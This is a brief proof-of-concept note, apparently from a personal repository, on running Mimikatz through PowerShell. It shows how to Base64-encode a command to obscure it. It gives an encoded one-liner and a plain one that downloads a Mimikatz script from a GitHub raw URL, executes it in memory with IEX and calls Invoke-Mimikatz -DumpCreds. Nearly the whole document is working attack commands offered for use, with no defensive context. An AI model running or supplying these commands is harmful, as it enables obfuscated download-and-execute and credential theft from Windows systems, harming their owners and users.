# poc mimikatz 

+ converting to Base64 encoded string
++ $Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 

+ running the encoded command with powershell
++ powershell.exe -encoded $Encoded

+ encoded.bat
++ powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBoAGEAYwBrAGMAbwAvAHAAbwBjAC8AbQBhAHMAdABlAHIALwBtAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAuAHQAeAB0ACcAKQA7ACAAIAA9ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzADsAIAA=


+ not encode
++ powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/chackco/poc/master/mimikatz.ps1.txt'); $m = Invoke-Mimikatz -DumpCreds; $m
